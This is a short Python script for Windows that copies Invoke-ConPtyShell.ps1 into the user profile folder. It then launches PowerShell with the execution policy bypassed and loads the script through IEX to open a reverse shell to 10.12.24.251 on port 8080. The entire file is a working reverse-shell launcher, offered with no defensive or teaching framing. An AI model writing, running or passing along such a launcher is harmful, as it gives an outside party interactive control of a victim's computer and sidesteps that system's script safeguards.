import subprocess
import time

# Get the user profile directory
user = subprocess.check_output(["echo", "%userprofile%"], shell=True, text=True).strip()
print("User profile directory:", user)

# Copy the PowerShell script to the user profile directory
src = 'Invoke-ConPtyShell.ps1'
subprocess.run(['xcopy', src, user, '/i', '/y'], shell=True)


# Open a command prompt in the user folder location
cmd_proc = subprocess.Popen('cmd.exe', cwd=user)

# Wait for the command prompt to open

# Define the PowerShell command to execute
powershell_cmd = 'powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -Command "IEX (Get-Content -Path .\\Invoke-ConPtyShell.ps1 -Raw); Invoke-ConPtyShell 10.12.24.251 8080"'

# Execute the PowerShell command in the same window as the Python script
subprocess.run(powershell_cmd, shell=True, cwd=user)

time.sleep(5)
